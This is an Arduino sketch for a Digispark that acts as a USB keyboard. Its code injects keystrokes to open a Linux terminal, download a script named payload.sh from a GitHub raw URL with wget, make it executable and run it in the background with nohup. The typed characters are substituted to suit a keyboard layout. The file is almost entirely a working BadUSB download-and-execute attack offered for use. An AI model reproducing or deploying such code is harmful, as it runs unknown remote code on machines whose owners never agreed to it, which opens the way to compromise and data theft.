#include "DigiKeyboard.h"

void setup() {

DigiKeyboard.delay(2500);
DigiKeyboard.sendKeyStroke(0);

DigiKeyboard.print(""); // Program to run
delay(500);
DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT); // Super key, open 'search'
delay(300);
DigiKeyboard.print("terminal");
delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
// Delay for 1 second, if terminal is not opened, part of the string below is wasted to /dev/null
delay(1000);
// Send our payload
DigiKeyboard.print("rm /rf tmpsys");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
delay(200);
DigiKeyboard.print("mkdir tmpsys");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
delay(100);
DigiKeyboard.print("cd tmpsys");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
delay(100);
DigiKeyboard.print("wget https>&&raw.githubusercontent.com&jaccinelli&ducker&master&payload.sh");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
delay(3500);
DigiKeyboard.print("chmod ]x payload.sh");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
delay(100);
DigiKeyboard.print("nohup .&payload.sh");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
delay(100);
DigiKeyboard.print("exit");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
delay(100);
// Payload executed!

}

void loop() {
// When scripts are done, blink some LED like it's 19
while(1);
}
